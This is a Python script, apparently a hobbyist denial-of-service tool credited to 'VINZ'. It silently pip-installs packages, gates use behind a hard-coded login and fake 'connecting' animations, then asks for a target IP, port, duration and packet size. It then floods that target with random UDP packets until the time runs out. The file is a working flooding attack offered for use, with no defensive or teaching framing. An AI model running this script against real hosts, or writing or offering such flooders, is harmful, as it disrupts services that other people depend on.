import os, sys, codecs

try:
    import socks, requests, wget, cfscrape, urllib3
except:
    if sys.platform.startswith("linux"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    elif sys.platform.startswith("freebsd"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    else:
        os.system("pip install pysocks requests wget cfscrape urllib3 scapy")

import os, sys, codecs

try:
    import socks, requests, wget, cfscrape, urllib3
except:
    if sys.platform.startswith("linux"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    elif sys.platform.startswith("freebsd"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    else:
        os.system("pip install pysocks requests wget cfscrape urllib3 scapy")

from time import time as tt
import threading
import socket
import random
import time

os.system("clear")
print("""
\033[35m╔═╗╔═╗╔═╗╔═╗\033[36m╦ ╦╔═╗╦═╗╔╦╗
\033[35m╠═╝╠═╣╚═╗╚═╗\033[36m║║║║ ║╠╦╝ ║║
\033[35m╩  ╩ ╩╚═╝╚═╝\033[36m╚╩╝╚═╝╩╚══╩╝
""")

account =str(input("\033[35m -Account : \033[36m"))
password =str(input("\033[35m -Password : \033[36m"))
time.sleep(2.5)
os.system("clear")
print("\033[37m -Connecting To Tools [\033[35m...\033[37m]")
time.sleep(1.5)
os.system("clear")
print("\033[37m -Connecting To Tools [\033[35m..\033[37m]")
time.sleep(1.5)
os.system("clear")
print("\033[37m -Connecting To Tools [\033[35m.\033[37m]")
time.sleep(1.5)
os.system("clear")
print("\033[37m -Connecting To Tools [\033[35m..\033[37m]")
time.sleep(1.5)
os.system("clear")
print("\033[37m -Connecting To Tools [\033[35m...\033[37m]")
time.sleep(1.5)
os.system("clear")
print("\033[37m -Connecting To Tools [\033[35m..\033[37m]")
time.sleep(1.5)
os.system("clear")
print("\033[37m -Connecting To Tools [\033[35m.\033[37m]")
time.sleep(1.5)
os.system("clear")
print("\033[37m -Connecting To Tools [\033[35m..\033[37m]")
time.sleep(1.5)
os.system("clear")
print("\033[37m -Connecting To Tools [\033[35m...\033[37m]")
time.sleep(1.5)
os.system("clear")
if account == "VINZ" and password == "kontolgede":
	print("\033[37m -Login Sucessfull [\033[32m!\033[37m]")
	time.sleep(3.2)
else:
	print("\033[37m -Wrong Password/Account [\033[31m!\033[37m]")
	exit()
	
os.system("clear")
print("""

\033[35m╔═══╦╗──╔╦═══╦═══╗\033[36m╔════╦═══╦═══╦═╗╔═╗
\033[35m║╔══╣╚╗╔╝║╔══╣╔═╗║\033[36m║╔╗╔╗║╔══╣╔═╗║║╚╝║║
\033[35m║╚══╬╗╚╝╔╣╚══╣╚══╗\033[36m╚╝║║╚╣╚══╣║─║║╔╗╔╗║
\033[35m║╔══╝╚╗╔╝║╔══╩══╗║\033[36m──║║─║╔══╣╚═╝║║║║║║
\033[35m║╚══╗─║║─║╚══╣╚═╝║\033[36m──║║─║╚══╣╔═╗║║║║║║
\033[35m╚═══╝─╚╝─╚═══╩═══╝\033[36m──╚╝─╚═══╩╝─╚╩╝╚╝╚╝
""")
print("\033[35m            |\033[36m   Tools By VINZ\033[35m    |\n")

ip = str(input("\033[35m -Ip Target \033[36m: \033[31m"))
port = int(input("\033[35m -Port Target \033[36m: \033[31m"))
time = int(input("\033[35m -Packets \033[36m: \033[31m"))
size = int(input("\033[35m -Size Packets \033[36m: \033[31m"))

os.system("clear")

brand = """\033[33m
                         __    _                                   
                    _wr""        "-q__                             
                 _dP                 9m_     
               _#P                     9#_                         
              d#@                       9#m                        
             d##                         ###                       
            J###                         ###L                      
            {###K                       J###K                      
            ]####K      ___aaa___      J####F                      
        __gmM######_  w#P""   ""9#m  _d#####Mmw__                  
     _g##############mZ_         __g##############m_               
   _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_             
  a###""          ,Z"#####@" '######"\g          ""M##m            
 J#@"             0L  "*##     ##@"  J#              *#K           
 #"               `#    "_gmwgm_~    dF               `#_          
7F                 "#_   ]#####F   _dK                 JE          
]                    *m__ ##### __g@"                   F          
                       "PJ#####LP"                                 
 `                       0######_                      '           
                       _0########_                                   
     .               _d#####^#####m__              ,              
      "*w_________am#####P"   ~9#####mw_________w*"                  
          ""9@#####@M""           ""P@#####@M""                    

"""

os.system("clear")
def attack(ip, port, time, size):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(brand)
    print("\033[31m       -$-$-$-$- Attack Has Launched! -$-$-$-$-")
    fmt = '\033[91m       Attack To Ip {ip}, Port {port}, '.format(ip=ip,
        port='{port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    size = os.urandom(min(65500, size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(size, (ip, port))

    print('\033[92mAttack Finished')
    os.system("clear")

if __name__ == '__main__':
    try:
        attack(ip, port, time, size)
    except KeyboardInterrupt:
        print('Attack stopped.')